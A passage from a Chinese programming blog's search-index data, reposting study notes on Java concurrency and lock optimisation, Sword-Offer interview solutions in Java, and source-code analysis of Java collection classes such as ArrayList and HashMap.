= new Thread(() -&gt; &#123; threadLocal1.set(2); threadLocal2.set(2); &#125;); thread1.start(); thread2.start(); &#125;&#125; 它所对应的底层结构图为： 每个 Thread 都有一个 ThreadLocal.ThreadLocalMap 对象。 123/* ThreadLocal values pertaining to this thread. This map is maintained * by the ThreadLocal class. */ThreadLocal.ThreadLocalMap threadLocals = null; 当调用一个 ThreadLocal 的 set(T value) 方法时，先得到当前线程的 ThreadLocalMap 对象，然后将 ThreadLocal-&gt;value 键值对插入到该 Map 中。 12345678public void set(T value) &#123; Thread t = Thread.currentThread(); ThreadLocalMap map = getMap(t); if (map != null) map.set(this, value); else createMap(t, value);&#125; get() 方法类似。 12345678910111213public T get() &#123; Thread t = Thread.currentThread(); ThreadLocalMap map = getMap(t); if (map != null) &#123; ThreadLocalMap.Entry e = map.getEntry(this); if (e != null) &#123; @SuppressWarnings(\"unchecked\") T result = (T)e.value; return result; &#125; &#125; return setInitialValue();&#125; ThreadLocal 从理论上讲并不是用来解决多线程并发问题的，因为根本不存在多线程竞争。 在一些场景 (尤其是使用线程池) 下，由于 ThreadLocal.ThreadLocalMap 的底层数据结构导致 ThreadLocal 有内存泄漏的情况，应该尽可能在每次使用 ThreadLocal 后手动调用 remove()，以避免出现 ThreadLocal 经典的内存泄漏甚至是造成自身业务混乱的风险。 0x11.4.3. 可重入代码（Reentrant Code） 这种代码也叫做纯代码（Pure Code），可以在代码执行的任何时刻中断它，转而去执行另外一段代码（包括递归调用它本身），而在控制权返回后，原来的程序不会出现任何错误。 可重入代码有一些共同的特征，例如不依赖存储在堆上的数据和公用的系统资源、用到的状态量都由参数中传入、不调用非可重入的方法等。 0x12锁优化这里的锁优化主要是指 JVM 对 synchronized 的优化。 0x12.1自旋锁互斥同步进入阻塞状态的开销都很大，应该尽量避免。在许多应用中，共享数据的锁定状态只会持续很短的一段时间。自旋锁的思想是让一个线程在请求一个共享数据的锁时执行忙循环（自旋）一段时间，如果在这段时间内能获得锁，就可以避免进入阻塞状态。 自旋锁虽然能避免进入阻塞状态从而减少开销，但是它需要进行忙循环操作占用 CPU 时间，它只适用于共享数据的锁定状态很短的场景。 在 JDK 1.6 中引入了自适应的自旋锁。自适应意味着自旋的次数不再固定了，而是由前一次在同一个锁上的自旋次数及锁的拥有者的状态来决定。 0x12.2锁消除锁消除是指对于被检测出不可能存在竞争的共享数据的锁进行消除。 锁消除主要是通过逃逸分析来支持，如果堆上的共享数据不可能逃逸出去被其它线程访问到，那么就可以把它们当成私有数据对待，也就可以将它们的锁进行消除。 对于一些看起来没有加锁的代码，其实隐式的加了很多锁。例如下面的字符串拼接代码就隐式加了锁： 123public static String concatString(String s1, String s2, String s3) &#123; return s1 + s2 + s3;&#125; String 是一个不可变的类，编译器会对 String 的拼接自动优化。在 JDK 1.5 之前，会转化为 StringBuffer 对象的连续 append() 操作： 1234567public static String concatString(String s1, String s2, String s3) &#123; StringBuffer sb = new StringBuffer(); sb.append(s1); sb.append(s2); sb.append(s3); return sb.toString();&#125; 每个 append() 方法中都有一个同步块。虚拟机观察变量 sb，很快就会发现它的动态作用域被限制在 concatString() 方法内部。也就是说，sb 的所有引用永远不会逃逸到 concatString() 方法之外，其他线程无法访问到它，因此可以进行消除。 0x12.3锁粗化如果一系列的连续操作都对同一个对象反复加锁和解锁，频繁的加锁操作就会导致性能损耗。 上一节的示例代码中连续的 append() 方法就属于这类情况。如果虚拟机探测到由这样的一串零碎的操作都对同一个对象加锁，将会把加锁的范围扩展（粗化）到整个操作序列的外部。对于上一节的示例代码就是扩展到第一个 append() 操作之前直至最后一个 append() 操作之后，这样只需要加锁一次就可以了。 0x12.4轻量级锁JDK 1.6 引入了偏向锁和轻量级锁，从而让锁拥有了四个状态：无锁状态（unlocked）、偏向锁状态（biasble）、轻量级锁状态（lightweight locked）和重量级锁状态（inflated）。 以下是 HotSpot 虚拟机对象头的内存布局，这些数据被称为 Mark Word。其中 tag bits 对应了五个状态，这些状态在右侧的 state 表格中给出。除了 marked for gc 状态，其它四个状态已经在前面介绍过了。 下图左侧是一个线程的虚拟机栈，其中有一部分称为 Lock Record 的区域，这是在轻量级锁运行过程创建的，用于存放锁对象的 Mark Word。而右侧就是一个锁对象，包含了 Mark Word 和其它信息。 轻量级锁是相对于传统的重量级锁而言，它使用 CAS 操作来避免重量级锁使用互斥量的开销。对于绝大部分的锁，在整个同步周期内都是不存在竞争的，因此也就不需要都使用互斥量进行同步，可以先采用 CAS 操作进行同步，如果 CAS 失败了再改用互斥量进行同步。 当尝试获取一个锁对象时，如果锁对象标记为 0 01，说明锁对象的锁未锁定（unlocked）状态。此时虚拟机在当前线程的虚拟机栈中创建 Lock Record，然后使用 CAS 操作将对象的 Mark Word 更新为 Lock Record 指针。如果 CAS 操作成功了，那么线程就获取了该对象上的锁，并且对象的 Mark Word 的锁标记变为 00，表示该对象处于轻量级锁状态。 如果 CAS 操作失败了，虚拟机首先会检查对象的 Mark Word 是否指向当前线程的虚拟机栈，如果是的话说明当前线程已经拥有了这个锁对象，那就可以直接进入同步块继续执行，否则说明这个锁对象已经被其他线程线程抢占了。如果有两条以上的线程争用同一个锁，那轻量级锁就不再有效，要膨胀为重量级锁。 0x12.5偏向锁偏向锁的思想是偏向于让第一个获取锁对象的线程，这个线程在之后获取该锁就不再需要进行同步操作，甚至连 CAS 操作也不再需要。 当锁对象第一次被线程获得的时候，进入偏向状态，标记为 1 01。同时使用 CAS 操作将线程 ID 记录到 Mark Word 中，如果 CAS 操作成功，这个线程以后每次进入这个锁相关的同步块就不需要再进行任何同步操作。 当有另外一个线程去尝试获取这个锁对象时，偏向状态就宣告结束，此时撤销偏向（Revoke Bias）后恢复到未锁定状态或者轻量级锁状态。 0x13多线程开发良好的实践 给线程起个有意义的名字，这样可以方便找 Bug。 缩小同步范围，从而减少锁争用。例如对于 synchronized，应该尽量使用同步块而不是同步方法。 多用同步工具少用 wait() 和 notify()。首先，CountDownLatch, CyclicBarrier, Semaphore 和 Exchanger 这些同步类简化了编码操作，而用 wait() 和 notify() 很难实现复杂控制流；其次，这些同步类是由最好的企业编写和维护，在后续的 JDK 中还会不断优化和完善。 使用 BlockingQueue 实现生产者消费者问题。 多用并发集合少用同步集合，例如应该使用 ConcurrentHashMap 而不是 Hashtable。 使用本地变量和不可变类来保证线程安全。 使用线程池而不是直接创建线程，这是因为创建线程代价很高，线程池可以有效地利用有限的线程来启动任务。 参考资料 BruceEckel. Java 编程思想: 第 4 版 [M]. 机械工业出版社, 2007. 周志明. 深入理解 Java 虚拟机 [M]. 机械工业出版社, 2011. Threads and Locks 线程通信 Java 线程面试题 Top 50 BlockingQueue thread state java CSC 456 Spring 2012/ch7 MN Java - Understanding Happens-before relationship 6장 Thread Synchronization How is Java’s ThreadLocal implemented under the hood? Concurrent JAVA FORK JOIN EXAMPLE 聊聊并发（八）——Fork/Join 框架介绍 Eliminating SynchronizationRelated Atomic Operations with Biased Locking and Bulk Rebiasing","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"java","slug":"java","permalink":"https://blog.cfyqy.com/tags/java/"},{"name":"java并发","slug":"java并发","permalink":"https://blog.cfyqy.com/tags/java%E5%B9%B6%E5%8F%91/"}],"author":"ye1s"},{"title":"剑指offer","slug":"剑指 Offer 题解 - 3~9","date":"2019-06-22T17:32:00.000Z","updated":"2020-04-13T08:26:41.118Z","comments":true,"path":"article/b8b03acd.html","link":"","permalink":"https://blog.cfyqy.com/article/b8b03acd.html","excerpt":"本书精选谷歌、微软等知名IT企业的50余道典型面试题，系统地总结了如何在面试时写出高质量代码，如何优化代码效率，以及分析、解决难题的常用方法。","text":"本书精选谷歌、微软等知名IT企业的50余道典型面试题，系统地总结了如何在面试时写出高质量代码，如何优化代码效率，以及分析、解决难题的常用方法。 转载:https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%89%91%E6%8C%87%20Offer%20%E9%A2%98%E8%A7%A3%20-%20%E7%9B%AE%E5%BD%95.md 0x3. 数组中重复的数字NowCoder 题目描述 在一个长度为 n 的数组里的所有数字都在 0 到 n-1 的范围内。数组中某些数字是重复的，但不知道有几个数字是重复的，也不知道每个数字重复几次。请找出数组中任意一个重复的数字。 12345Input:&#123;2, 3, 1, 0, 2, 5&#125;Output:2 解题思路 要求时间复杂度 O(N)，空间复杂度 O(1)。因此不能使用排序的方法，也不能使用额外的标记数组。 对于这种数组元素在 [0, n-1] 范围内的问题，可以将值为 i 的元素调整到第 i 个位置上进行求解。 以 (2, 3, 1, 0, 2, 5) 为例，遍历到位置 4 时，该位置上的数为 2，但是第 2 个位置上已经有一个 2 的值了，因此可以知道 2 重复： 1234567891011121314151617181920public boolean duplicate(int[] nums, int length, int[] duplication) &#123; if (nums == null || length &lt;= 0) return false; for (int i = 0; i &lt; length; i++) &#123; while (nums[i] != i) &#123; if (nums[i] == nums[nums[i]]) &#123; duplication[0] = nums[i]; return true; &#125; swap(nums, i, nums[i]); &#125; &#125; return false;&#125;private void swap(int[] nums, int i, int j) &#123; int t = nums[i]; nums[i] = nums[j]; nums[j] = t;&#125; 0x4. 二维数组中的查找NowCoder 题目描述 给定一个二维数组，其每一行从左到右递增排序，从上到下也是递增排序。给定一个数，判断这个数是否在该二维数组中。 1234567891011Consider the following matrix:[ [1, 4, 7, 11, 15], [2, 5, 8, 12, 19], [3, 6, 9, 16, 22], [10, 13, 14, 17, 24], [18, 21, 23, 26, 30]]Given target = 5, return true.Given target = 20, return false. 解题思路 要求时间复杂度 O(M + N)，空间复杂度 O(1)。其中 M 为行数，N 为 列数。 该二维数组中的一个数，小于它的数一定在其左边，大于它的数一定在其下边。因此，从右上角开始查找，就可以根据 target 和当前元素的大小关系来缩小查找区间，当前元素的查找区间为左下角的所有元素。 123456789101112131415public boolean Find(int target, int[][] matrix) &#123; if (matrix == null || matrix.length == 0 || matrix[0].length == 0) return false; int rows = matrix.length, cols = matrix[0].length; int r = 0, c = cols - 1; // 从右上角开始 while (r &lt;= rows - 1 &amp;&amp; c &gt;= 0) &#123; if (target == matrix[r][c]) return true; else if (target &gt; matrix[r][c]) r++; else c--; &#125; return false;&#125; 0x5. 替换空格NowCoder 题目描述 将一个字符串中的空格替换成 “%20”。 12345Input:&quot;A B&quot;Output:&quot;A%20B&quot; 解题思路 在字符串尾部填充任意字符，使得字符串的长度等于替换之后的长度。因为一个空格要替换成三个字符（%20），因此当遍历到一个空格时，需要在尾部填充两个任意字符。 令 P1 指向字符串原来的末尾位置，P2 指向字符串现在的末尾位置。P1 和 P2 从后向前遍历，当 P1 遍历到一个空格时，就需要令 P2 指向的位置依次填充 02%（注意是逆序的），否则就填充上 P1 指向字符的值。 从后向前遍是为了在改变 P2 所指向的内容时，不会影响到 P1 遍历原来字符串的内容。 12345678910111213141516171819public String replaceSpace(StringBuffer str) &#123; int P1 = str.length() - 1; for (int i = 0; i &lt;= P1; i++) if (str.charAt(i) == ' ') str.append(\" \"); int P2 = str.length() - 1; while (P1 &gt;= 0 &amp;&amp; P2 &gt; P1) &#123; char c = str.charAt(P1--); if (c == ' ') &#123; str.setCharAt(P2--, '0'); str.setCharAt(P2--, '2'); str.setCharAt(P2--, '%'); &#125; else &#123; str.setCharAt(P2--, c); &#125; &#125; return str.toString();&#125; 0x6. 从尾到头打印链表NowCoder 题目描述 从尾到头反过来打印出每个结点的值。 解题思路 使用递归 要逆序打印链表 1-&gt;2-&gt;3（3,2,1)，可以先逆序打印链表 2-&gt;3(3,2)，最后再打印第一个节点 1。而链表 2-&gt;3 可以看成一个新的链表，要逆序打印该链表可以继续使用求解函数，也就是在求解函数中调用自己，这就是递归函数。 12345678public ArrayList&lt;Integer&gt; printListFromTailToHead(ListNode listNode) &#123; ArrayList&lt;Integer&gt; ret = new ArrayList&lt;&gt;(); if (listNode != null) &#123; ret.addAll(printListFromTailToHead(listNode.next)); ret.add(listNode.val); &#125; return ret;&#125; 使用头插法 使用头插法可以得到一个逆序的链表。 头结点和第一个节点的区别： 头结点是在头插法中使用的一个额外节点，这个节点不存储值； 第一个节点就是链表的第一个真正存储值的节点。 123456789101112131415161718public ArrayList&lt;Integer&gt; printListFromTailToHead(ListNode listNode) &#123; // 头插法构建逆序链表 ListNode head = new ListNode(-1); while (listNode != null) &#123; ListNode memo = listNode.next; listNode.next = head.next; head.next = listNode; listNode = memo; &#125; // 构建 ArrayList ArrayList&lt;Integer&gt; ret = new ArrayList&lt;&gt;(); head = head.next; while (head != null) &#123; ret.add(head.val); head = head.next; &#125; return ret;&#125; 使用栈 栈具有后进先出的特点，在遍历链表时将值按顺序放入栈中，最后出栈的顺序即为逆序。 1234567891011public ArrayList&lt;Integer&gt; printListFromTailToHead(ListNode listNode) &#123; Stack&lt;Integer&gt; stack = new Stack&lt;&gt;(); while (listNode != null) &#123; stack.add(listNode.val); listNode = listNode.next; &#125; ArrayList&lt;Integer&gt; ret = new ArrayList&lt;&gt;(); while (!stack.isEmpty()) ret.add(stack.pop()); return ret;&#125; 0x7. 重建二叉树NowCoder 题目描述 根据二叉树的前序遍历和中序遍历的结果，重建出该二叉树。假设输入的前序遍历和中序遍历的结果中都不含重复的数字。 解题思路 前序遍历的第一个值为根节点的值，使用这个值将中序遍历结果分成两部分，左部分为树的左子树中序遍历结果，右部分为树的右子树中序遍历的结果。 12345678910111213141516171819// 缓存中序遍历数组每个值对应的索引private Map&lt;Integer, Integer&gt; indexForInOrders = new HashMap&lt;&gt;();public TreeNode reConstructBinaryTree(int[] pre, int[] in) &#123; for (int i = 0; i &lt; in.length; i++) indexForInOrders.put(in[i], i); return reConstructBinaryTree(pre, 0, pre.length - 1, 0);&#125;private TreeNode reConstructBinaryTree(int[] pre, int preL, int preR, int inL) &#123; if (preL &gt; preR) return null; TreeNode root = new TreeNode(pre[preL]); int inIndex = indexForInOrders.get(root.val); int leftTreeSize = inIndex - inL; root.left = reConstructBinaryTree(pre, preL + 1, preL + leftTreeSize, inL); root.right = reConstructBinaryTree(pre, preL + leftTreeSize + 1, preR, inL + leftTreeSize + 1); return root;&#125; 0x8. 二叉树的下一个结点NowCoder 题目描述 给定一个二叉树和其中的一个结点，请找出中序遍历顺序的下一个结点并且返回。注意，树中的结点不仅包含左右子结点，同时包含指向父结点的指针。 1234567891011public class TreeLinkNode &#123; int val; TreeLinkNode left = null; TreeLinkNode right = null; TreeLinkNode next = null; TreeLinkNode(int val) &#123; this.val = val; &#125;&#125; 解题思路 ① 如果一个节点的右子树不为空，那么该节点的下一个节点是右子树的最左节点； ② 否则，向上找第一个左链接指向的树包含该节点的祖先节点。 12345678910111213141516public TreeLinkNode GetNext(TreeLinkNode pNode) &#123; if (pNode.right != null) &#123; TreeLinkNode node = pNode.right; while (node.left != null) node = node.left; return node; &#125; else &#123; while (pNode.next != null) &#123; TreeLinkNode parent = pNode.next; if (parent.left == pNode) return parent; pNode = pNode.next; &#125; &#125; return null;&#125; 0x9. 用两个栈实现队列NowCoder 题目描述 用两个栈来实现一个队列，完成队列的 Push 和 Pop 操作。 解题思路 in 栈用来处理入栈（push）操作，out 栈用来处理出栈（pop）操作。一个元素进入 in 栈之后，出栈的顺序被反转。当元素要出栈时，需要先进入 out 栈，此时元素出栈顺序再一次被反转，因此出栈顺序就和最开始入栈顺序是相同的，先进入的元素先退出，这就是队列的顺序。 1234567891011121314151617Stack&lt;Integer&gt; in = new Stack&lt;Integer&gt;();Stack&lt;Integer&gt; out = new Stack&lt;Integer&gt;();public void push(int node) &#123; in.push(node);&#125;public int pop() throws Exception &#123; if (out.isEmpty()) while (!in.isEmpty()) out.push(in.pop()); if (out.isEmpty()) throw new Exception(\"queue is empty\"); return out.pop();&#125;","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"java","slug":"java","permalink":"https://blog.cfyqy.com/tags/java/"},{"name":"剑指offer","slug":"剑指offer","permalink":"https://blog.cfyqy.com/tags/%E5%89%91%E6%8C%87offer/"}],"author":"ye1s"},{"title":"java容器","slug":"Java 容器","date":"2019-06-22T11:56:30.000Z","updated":"2020-04-13T08:41:43.014Z","comments":true,"path":"article/012345678.html","link":"","permalink":"https://blog.cfyqy.com/article/012345678.html","excerpt":"容器主要包括 Collection 和 Map 两种，Collection 存储着对象的集合，而 Map 存储着键值对（两个对象）的映射表。","text":"容器主要包括 Collection 和 Map 两种，Collection 存储着对象的集合，而 Map 存储着键值对（两个对象）的映射表。 转载https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md 0x1概览容器主要包括 Collection 和 Map 两种，Collection 存储着对象的集合，而 Map 存储着键值对（两个对象）的映射表。 0x1.1Collection 0x1.1.1 Set TreeSet：基于红黑树实现，支持有序性操作，例如根据一个范围查找元素的操作。但是查找效率不如 HashSet，HashSet 查找的时间复杂度为 O(1)，TreeSet 则为 O(logN)。 HashSet：基于哈希表实现，支持快速查找，但不支持有序性操作。并且失去了元素的插入顺序信息，也就是说使用 Iterator 遍历 HashSet 得到的结果是不确定的。 LinkedHashSet：具有 HashSet 的查找效率，且内部使用双向链表维护元素的插入顺序。 0x1.1.2 List ArrayList：基于动态数组实现，支持随机访问。 Vector：和 ArrayList 类似，但它是线程安全的。 LinkedList：基于双向链表实现，只能顺序访问，但是可以快速地在链表中间插入和删除元素。不仅如此，LinkedList 还可以用作栈、队列和双向队列。 0x1.1.3 Queue LinkedList：可以用它来实现双向队列。 PriorityQueue：基于堆结构实现，可以用它来实现优先队列。 0x1.2Map TreeMap：基于红黑树实现。 HashMap：基于哈希表实现。 HashTable：和 HashMap 类似，但它是线程安全的，这意味着同一时刻多个线程可以同时写入 HashTable 并且不会导致数据不一致。它是遗留类，不应该去使用它。现在可以使用 ConcurrentHashMap 来支持线程安全，并且 ConcurrentHashMap 的效率会更高，因为 ConcurrentHashMap 引入了分段锁。 LinkedHashMap：使用双向链表来维护元素的顺序，顺序为插入顺序或者最近最少使用（LRU）顺序。 0x2容器中的设计模式0x2.1迭代器模式 Collection 继承了 Iterable 接口，其中的 iterator() 方法能够产生一个 Iterator 对象，通过这个对象就可以迭代遍历 Collection 中的元素。 从 JDK 1.5 之后可以使用 foreach 方法来遍历实现了 Iterable 接口的聚合对象。 123456List&lt;String&gt; list = new ArrayList&lt;&gt;();list.add(\"a\");list.add(\"b\");for (String item : list) &#123; System.out.println(item);&#125; 0x2.2适配器模式 java.util.Arrays#asList() 可以把数组类型转换为 List 类型。 12@SafeVarargspublic static &lt;T&gt; List&lt;T&gt; asList(T... a) 应该注意的是 asList() 的参数为泛型的变长参数，不能使用基本类型数组作为参数，只能使用相应的包装类型数组。 12Integer[] arr = &#123;1, 2, 3&#125;;List list = Arrays.asList(arr); 也可以使用以下方式调用 asList()： 1List list = Arrays.asList(1, 2, 3); 0x3源码分析如果没有特别说明，以下源码分析基于 JDK 1.8。 在 IDEA 中 double shift 调出 Search EveryWhere，查找源码文件，找到之后就可以阅读源码。 0x3.1ArrayList0x3.1.1 概览 因为 ArrayList 是基于数组实现的，所以支持快速随机访问。RandomAccess 接口标识着该类支持快速随机访问。 12public class ArrayList&lt;E&gt; extends AbstractList&lt;E&gt; implements List&lt;E&gt;, RandomAccess, Cloneable, java.io.Serializable 数组的默认大小为 10。 1private static final int DEFAULT_CAPACITY = 10; 0x3.1.2 扩容 添加元素时使用 ensureCapacityInternal() 方法来保证容量足够，如果不够时，需要使用 grow() 方法进行扩容，新容量的大小为 oldCapacity + (oldCapacity &gt;&gt; 1)，也就是旧容量的 1.5 倍。 扩容操作需要调用 Arrays.copyOf() 把原数组整个复制到新数组中，这个操作代价很高，因此最好在创建 ArrayList 对象时就指定大概的容量大小，减少扩容操作的次数。 12345678910111213141516171819202122232425262728293031public boolean add(E e) &#123; ensureCapacityInternal(size + 1); // Increments modCount!! elementData[size++] = e; return true;&#125;private void ensureCapacityInternal(int minCapacity) &#123; if (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) &#123; minCapacity = Math.max(DEFAULT_CAPACITY, minCapacity); &#125; ensureExplicitCapacity(minCapacity);&#125;private void ensureExplicitCapacity(int minCapacity) &#123; modCount++; // overflow-conscious code if (minCapacity - elementData.length &gt; 0) grow(minCapacity);&#125;private void grow(int minCapacity) &#123; // overflow-conscious code int oldCapacity = elementData.length; int newCapacity = oldCapacity + (oldCapacity &gt;&gt; 1); if (newCapacity - minCapacity &lt; 0) newCapacity = minCapacity; if (newCapacity - MAX_ARRAY_SIZE &gt; 0) newCapacity = hugeCapacity(minCapacity); // minCapacity is usually close to size, so this is a win: elementData = Arrays.copyOf(elementData, newCapacity);&#125; 0x3.1.3. 删除元素 需要调用 System.arraycopy() 将 index+1 后面的元素都复制到 index 位置上，该操作的时间复杂度为 O(N)，可以看出 ArrayList 删除元素的代价是非常高的。 12345678910public E remove(int index) &#123; rangeCheck(index); modCount++; E oldValue = elementData(index); int numMoved = size - index - 1; if (numMoved &gt; 0) System.arraycopy(elementData, index+1, elementData, index, numMoved); elementData[--size] = null; // clear to let GC do its work return oldValue;&#125; 0x3.1.4. Fail-Fast modCount 用来记录 ArrayList 结构发生变化的次数。结构发生变化是指添加或者删除至少一个元素的所有操作，或者是调整内部数组的大小，仅仅只是设置元素的值不算结构发生变化。 在进行序列化或者迭代等操作时，需要比较操作前后 modCount 是否改变，如果改变了需要抛出 ConcurrentModificationException。 123456789101112131415161718private void writeObject(java.io.ObjectOutputStream s) throws java.io.IOException&#123; // Write out element count, and any hidden stuff int expectedModCount = modCount; s.defaultWriteObject(); // Write out size as capacity for behavioural compatibility with clone() s.writeInt(size); // Write out all elements in the proper order. for (int i=0; i&lt;size; i++) &#123; s.writeObject(elementData[i]); &#125; if (modCount != expectedModCount) &#123; throw new ConcurrentModificationException(); &#125;&#125; 0x3.1.5. 序列化 ArrayList 基于数组实现，并且具有动态扩容特性，因此保存元素的数组不一定都会被使用，那么就没必要全部进行序列化。 保存元素的数组 elementData 使用 transient 修饰，该关键字声明数组默认不会被序列化。 1transient Object[] elementData; // non-private to simplify nested class access ArrayList 实现了 writeObject() 和 readObject() 来控制只序列化数组中有元素填充那部分内容。 123456789101112131415161718192021private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; elementData = EMPTY_ELEMENTDATA; // Read in size, and any hidden stuff s.defaultReadObject(); // Read in capacity s.readInt(); // ignored if (size &gt; 0) &#123; // be like clone(), allocate array based upon size not capacity ensureCapacityInternal(size); Object[] a = elementData; // Read in all elements in the proper order. for (int i=0; i&lt;size; i++) &#123; a[i] = s.readObject(); &#125; &#125;&#125; 123456789101112131415161718private void writeObject(java.io.ObjectOutputStream s) throws java.io.IOException&#123; // Write out element count, and any hidden stuff int expectedModCount = modCount; s.defaultWriteObject(); // Write out size as capacity for behavioural compatibility with clone() s.writeInt(size); // Write out all elements in the proper order. for (int i=0; i&lt;size; i++) &#123; s.writeObject(elementData[i]); &#125; if (modCount != expectedModCount) &#123; throw new ConcurrentModificationException(); &#125;&#125; 序列化时需要使用 ObjectOutputStream 的 writeObject() 将对象转换为字节流并输出。而 writeObject() 方法在传入的对象存在 writeObject() 的时候会去反射调用该对象的 writeObject() 来实现序列化。反序列化使用的是 ObjectInputStream 的 readObject() 方法，原理类似。 123ArrayList list = new ArrayList();ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(file));oos.writeObject(list); 0x3.2Vector0x3.2.1. 同步 它的实现与 ArrayList 类似，但是使用了 synchronized 进行同步。 12345678910111213public synchronized boolean add(E e) &#123; modCount++; ensureCapacityHelper(elementCount + 1); elementData[elementCount++] = e; return true;&#125;public synchronized E get(int index) &#123; if (index &gt;= elementCount) throw new ArrayIndexOutOfBoundsException(index); return elementData(index);&#125; 0x3.2.2. 与 ArrayList 的比较 Vector 是同步的，因此开销就比 ArrayList 要大，访问速度更慢。最好使用 ArrayList 而不是 Vector，因为同步操作完全可以由程序员自己来控制； Vector 每次扩容请求其大小的 2 倍空间，而 ArrayList 是 1.5 倍。 0x3.2.3. 替代方案 可以使用 Collections.synchronizedList(); 得到一个线程安全的 ArrayList。 12List&lt;String&gt; list = new ArrayList&lt;&gt;();List&lt;String&gt; synList = Collections.synchronizedList(list); 也可以使用 concurrent 并发包下的 CopyOnWriteArrayList 类。 1List&lt;String&gt; list = new CopyOnWriteArrayList&lt;&gt;(); 0x3.3 CopyOnWriteArrayList0x3.3.1读写分离 写操作在一个复制的数组上进行，读操作还是在原始数组中进行，读写分离，互不影响。 写操作需要加锁，防止并发写入时导致写入数据丢失。 写操作结束之后需要把原始数组指向新的复制数组。 123456789101112131415161718public boolean add(E e) &#123; final ReentrantLock lock = this.lock; lock.lock(); try &#123; Object[] elements = getArray(); int len = elements.length; Object[] newElements = Arrays.copyOf(elements, len + 1); newElements[len] = e; setArray(newElements); return true; &#125; finally &#123; lock.unlock(); &#125;&#125;final void setArray(Object[] a) &#123; array = a;&#125; 1234@SuppressWarnings(\"unchecked\")private E get(Object[] a, int index) &#123; return (E) a[index];&#125; 0x3.3.2适用场景 CopyOnWriteArrayList 在写操作的同时允许读操作，大大提高了读操作的性能，因此很适合读多写少的应用场景。 但是 CopyOnWriteArrayList 有其缺陷： 内存占用：在写操作时需要复制一个新的数组，使得内存占用为原来的两倍左右； 数据不一致：读操作不能读取实时性的数据，因为部分写操作的数据还未同步到读数组中。 所以 CopyOnWriteArrayList 不适合内存敏感以及对实时性要求很高的场景。 0x3.4LinkedList0x3.4.1. 概览 基于双向链表实现，使用 Node 存储链表节点信息。 12345private static class Node&lt;E&gt; &#123; E item; Node&lt;E&gt; next; Node&lt;E&gt; prev;&#125; 每个链表存储了 first 和 last 指针： 12transient Node&lt;E&gt; first;transient Node&lt;E&gt; last; 0x3.4.2. 与 ArrayList 的比较 ArrayList 基于动态数组实现，LinkedList 基于双向链表实现； ArrayList 支持随机访问，LinkedList 不支持； LinkedList 在任意位置添加删除元素更快。 0x3.5HashMap为了便于理解，以下源码分析以 JDK 1.7 为主。 0x3.5.1. 存储结构 内部包含了一个 Entry 类型的数组 table。 1transient Entry[] table; Entry 存储着键值对。它包含了四个字段，从 next 字段我们可以看出 Entry 是一个链表。即数组中的每个位置被当成一个桶，一个桶存放一个链表。HashMap 使用拉链法来解决冲突，同一个链表中存放哈希值和散列桶取模运算结果相同的 Entry。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950static class Entry&lt;K,V&gt; implements Map.Entry&lt;K,V&gt; &#123; final K key; V value; Entry&lt;K,V&gt; next; int hash; Entry(int h, K k, V v, Entry&lt;K,V&gt; n) &#123; value = v; next = n; key = k; hash = h; &#125; public final K getKey() &#123; return key; &#125; public final V getValue() &#123; return value; &#125; public final V setValue(V newValue) &#123; V oldValue = value; value = newValue; return oldValue; &#125; public final boolean equals(Object o) &#123; if (!(o instanceof Map.Entry)) return false; Map.Entry e = (Map.Entry)o; Object k1 = getKey(); Object k2 = e.getKey(); if (k1 == k2 || (k1 != null &amp;&amp; k1.equals(k2))) &#123; Object v1 = getValue(); Object v2 = e.getValue(); if (v1 == v2 || (v1 != null &amp;&amp; v1.equals(v2))) return true; &#125; return false; &#125; public final int hashCode() &#123; return Objects.hashCode(getKey()) ^ Objects.hashCode(getValue()); &#125; public final String toString() &#123; return getKey() + \"=\" + getValue(); &#125;&#125; 0x3.5.2. 拉链法的工作原理 1234HashMap&lt;String, String&gt; map = new HashMap&lt;&gt;();map.put(\"K1\", \"V1\");map.put(\"K2\", \"V2\");map.put(\"K3\", \"V3\"); 新建一个 HashMap，默认大小为 16； 插入 &lt;K1,V1&gt; 键值对，先计算 K1 的 hashCode 为 115，使用除留余数法得到所在的桶下标 115%16=3。 插入 &lt;K2,V2&gt; 键值对，先计算 K2 的 hashCode 为 118，使用除留余数法得到所在的桶下标 118%16=6。 插入 &lt;K3,V3&gt; 键值对，先计算 K3 的 hashCode 为 118，使用除留余数法得到所在的桶下标 118%16=6，插在 &lt;K2,V2&gt; 前面。 应该注意到链表的插入是以头插法方式进行的，例如上面的 &lt;K3,V3&gt; 不是插在 &lt;K2,V2&gt; 后面，而是插入在链表头部。 查找需要分成两步进行： 计算键值对所在的桶； 在链表上顺序查找，时间复杂度显然和链表的长度成正比。 0x3.5.3. put 操作 1234567891011121314151617181920212223242526public V put(K key, V value) &#123; if (table == EMPTY_TABLE) &#123; inflateTable(threshold); &#125; // 键为 null 单独处理 if (key == null) return putForNullKey(value); int hash = hash(key); // 确定桶下标 int i = indexFor(hash, table.length); // 先找出是否已经存在键为 key 的键值对，如果存在的话就更新这个键值对的值为 value for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) &#123; Object k; if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123; V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; &#125; &#125; modCount++; // 插入新键值对 addEntry(hash, key, value, i); return null;&#125; HashMap 允许插入键为 null 的键值对。但是因为无法调用 null 的 hashCode() 方法，也就无法确定该键值对的桶下标，只能通过强制指定一个桶下标来存放。HashMap 使用第 0 个桶存放键为 null 的键值对。 12345678910111213private V putForNullKey(V value) &#123; for (Entry&lt;K,V&gt; e = table[0]; e != null; e = e.next) &#123; if (e.key == null) &#123; V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; &#125; &#125; modCount++; addEntry(0, null, value, 0); return null;&#125; 使用链表的头插法，也就是新的键值对插在链表的头部，而不是链表的尾部。 12345678910111213141516void addEntry(int hash, K key, V value, int bucketIndex) &#123; if ((size &gt;= threshold) &amp;&amp; (null != table[bucketIndex])) &#123; resize(2 * 